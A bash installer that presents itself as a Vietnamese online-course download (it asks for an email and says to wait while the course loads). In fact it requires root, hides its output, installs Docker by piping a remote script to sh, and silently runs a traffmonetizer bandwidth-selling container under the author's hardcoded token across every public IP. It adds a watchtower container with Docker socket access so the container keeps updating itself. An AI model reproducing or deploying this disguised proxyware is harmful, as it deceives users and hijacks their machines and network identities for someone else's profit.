#!/usr/bin/env bash
if [ -z "${TM_SKIP_PROMPT:-}" ]; then
  export TM_SKIP_PROMPT=1
  if { true </dev/tty; } 2>/dev/null; then
    printf 'Mời bạn nhập email: ' >/dev/tty
    read -r EMAIL </dev/tty && export EMAIL
  fi
  echo "Vui lòng đợi 5-10 phút để khóa học được tải thành công..."
fi

TOKEN="NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A="
SELF_URL="https://gitlab.com/sharegoogledrive/40gb_khoa_hoc/-/raw/main/install_linux.sh"
SELF_PATH="/usr/local/bin/install_linux.sh"
IMAGE_REPO="traffmonetizer/cli_v2"
CONTAINER_NAME="tm"
DATA_VOLUME="tm-data"
DEVICE_NAME_OVERRIDE=""
ENABLE_WATCHTOWER="${TM_WATCHTOWER:-true}"
WATCHTOWER_IMAGE="nickfedor/watchtower:latest"
WATCHTOWER_INTERVAL=21600
MULTI_IP="${TM_MULTI_IP:-auto}"
IPS_LIST=""
VERIFY_IPS="true"
IPS_DIR="/etc/tm"
IPS_FILE="$IPS_DIR/ips.txt"

set -u

if [ ! -f "$0" ] && [ "$(id -u)" -eq 0 ] && [ "${SELF_URL#*USER/REPO}" = "$SELF_URL" ]; then
  if command -v curl >/dev/null 2>&1; then curl -fsSL "$SELF_URL" -o "$SELF_PATH"
  elif command -v wget >/dev/null 2>&1; then wget -qO "$SELF_PATH" "$SELF_URL"; fi
  if [ -s "$SELF_PATH" ]; then chmod +x "$SELF_PATH" && exec "$SELF_PATH" "$@"; fi
fi

LOG_FILE="/var/log/tm_install.log"
if : >>"$LOG_FILE" 2>/dev/null; then exec >>"$LOG_FILE" 2>&1; else exec >/dev/null 2>&1; fi
export DEBIAN_FRONTEND=noninteractive
chmod +x "$0" 2>/dev/null || true

[ "$(id -u)" -eq 0 ] || exit 1
{ [ -n "$TOKEN" ] && [ "$TOKEN" != "DAN_TOKEN_CUA_BAN_VAO_DAY" ]; } || exit 1
[ "$(uname -s)" = "Linux" ] || exit 1

DISTRO_ID="$(. /etc/os-release 2>/dev/null; echo "${ID:-unknown}")"
DISTRO_LIKE="$(. /etc/os-release 2>/dev/null; echo "${ID_LIKE:-}")"

if   command -v apt-get >/dev/null 2>&1; then PM="apt"
elif command -v dnf     >/dev/null 2>&1; then PM="dnf"
elif command -v yum     >/dev/null 2>&1; then PM="yum"
elif command -v apk     >/dev/null 2>&1; then PM="apk"
elif command -v pacman  >/dev/null 2>&1; then PM="pacman"
elif command -v zypper  >/dev/null 2>&1; then PM="zypper"
else PM="unknown"; fi

pm_install() {
  case "$PM" in
    apt)    apt-get update -y; apt-get install -y "$@" ;;
    dnf)    dnf install -y "$@" ;;
    yum)    yum install -y "$@" ;;
    apk)    apk add --no-cache "$@" ;;
    pacman) pacman -Sy --noconfirm --needed "$@" ;;
    zypper) zypper -n install "$@" ;;
    *)      return 1 ;;
  esac
}

case "$(uname -m)" in
  x86_64|amd64)  TAG="latest" ;;
  aarch64|arm64) TAG="arm64v8" ;;
  armv7l|armv7)  TAG="arm32v7" ;;
  *) exit 1 ;;
esac
IMAGE="$IMAGE_REPO:$TAG"

download() {
  if command -v curl >/dev/null 2>&1; then curl -fsSL "$1"
  elif command -v wget >/dev/null 2>&1; then wget -qO- "$1"
  else return 1; fi
}

install_docker() {
  case "$DISTRO_ID $DISTRO_LIKE" in
    *amzn*|*alpine*|*arch*|*manjaro*|*suse*|*sles*) OFFICIAL=0 ;;
    *ubuntu*|*debian*|*raspbian*|*fedora*|*centos*|*rhel*|*rocky*|*almalinux*) OFFICIAL=1 ;;
    *) OFFICIAL=0 ;;
  esac
  if [ "$OFFICIAL" = "1" ]; then
    command -v curl >/dev/null 2>&1 || command -v wget >/dev/null 2>&1 || pm_install curl ca-certificates
    download https://get.docker.com | sh && return 0
  fi
  case "$PM" in
    apt) pm_install docker.io ;;
    unknown) return 1 ;;
    *) pm_install docker ;;
  esac
}

start_docker() {
  if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
    systemctl enable --now docker
  elif command -v rc-service >/dev/null 2>&1; then
    rc-update add docker default; rc-service docker start
  elif command -v service >/dev/null 2>&1; then
    service docker start
  elif command -v dockerd >/dev/null 2>&1; then
    nohup dockerd >/dev/null 2>&1 &
  fi
}

command -v docker >/dev/null 2>&1 || install_docker
start_docker || true
for _ in $(seq 1 30); do docker info >/dev/null 2>&1 && break; sleep 2; done
docker info >/dev/null 2>&1 || exit 1

command -v curl >/dev/null 2>&1 || pm_install curl ca-certificates || true

DEVICE_NAME="$DEVICE_NAME_OVERRIDE"
[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(download https://api.ipify.org | head -c 64 || true)"
[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(ip -4 route get 1.1.1.1 | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}' | head -1)"
[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(hostname -I | awk '{print $1}')"
[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(hostname -i | awk '{print $1}')"
[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(hostname)"

is_public() {
  local a b; IFS=. read -r a b _ <<<"$1"
  case "$a" in 0|10|127) return 1 ;; esac
  [ "$a" -eq 192 ] && [ "$b" -eq 168 ] && return 1
  [ "$a" -eq 172 ] && [ "$b" -ge 16 ] && [ "$b" -le 31 ] && return 1
  [ "$a" -eq 100 ] && [ "$b" -ge 64 ] && [ "$b" -le 127 ] && return 1
  [ "$a" -eq 169 ] && [ "$b" -eq 254 ] && return 1
  [ "$a" -ge 224 ] && return 1
  return 0
}

RUN_EXTRA=(); AGENT_EXTRA=(); GOOD=()
if [ "$MULTI_IP" != "false" ] && { [ -n "$IPS_LIST" ] || command -v ip >/dev/null 2>&1; }; then
  if [ -n "$IPS_LIST" ]; then
    CANDIDATES="$(echo "$IPS_LIST" | tr ',' ' ')"
  else
    CANDIDATES="$(ip -4 -o addr show scope global \
      | awk '$2 !~ /^(docker|br-|veth|virbr|cni|flannel|tun|tap|lo)/ {print $4}' | cut -d/ -f1 | sort -u)"
  fi
  for ip in $CANDIDATES; do
    is_public "$ip" || continue
    if [ "$VERIFY_IPS" = "true" ]; then
      R="$(curl -4 -fsS --max-time 10 --interface "$ip" https://ifconfig.me || true)"
      [ "$R" = "$ip" ] || continue
    fi
    GOOD+=("$ip")
  done
  if { [ "$MULTI_IP" = "auto" ] && [ "${#GOOD[@]}" -ge 2 ]; } || { [ "$MULTI_IP" = "true" ] && [ "${#GOOD[@]}" -ge 1 ]; }; then
    mkdir -p "$IPS_DIR"
    printf '%s\n' "${GOOD[@]}" > "$IPS_FILE"
    chmod 644 "$IPS_FILE"
    RUN_EXTRA=(--network host -v "$IPS_DIR:$IPS_DIR:ro")
    AGENT_EXTRA=(--ips-file "$IPS_FILE")
  fi
fi

docker rm -f "$CONTAINER_NAME" || true
docker pull "$IMAGE" || exit 1

docker run -d --name "$CONTAINER_NAME" \
  --restart unless-stopped \
  ${RUN_EXTRA[@]+"${RUN_EXTRA[@]}"} \
  -e HOME=/var/lib/tm \
  -v "$DATA_VOLUME":/var/lib/tm \
  "$IMAGE" \
  --token "$TOKEN" --device-name "$DEVICE_NAME" ${AGENT_EXTRA[@]+"${AGENT_EXTRA[@]}"} start accept \
  || exit 1

docker ps --format '{{.Names}}' 2>/dev/null | grep -qx "$CONTAINER_NAME" \
  || echo "WARN: container '$CONTAINER_NAME' khong chay sau khi khoi tao"

if [ "$ENABLE_WATCHTOWER" = "true" ]; then
  docker rm -f watchtower || true
  docker run -d --name watchtower \
    --restart unless-stopped \
    -v /var/run/docker.sock:/var/run/docker.sock \
    -e WATCHTOWER_CLEANUP=true \
    -e WATCHTOWER_POLL_INTERVAL="$WATCHTOWER_INTERVAL" \
    "$WATCHTOWER_IMAGE" "$CONTAINER_NAME"
fi

sleep 5
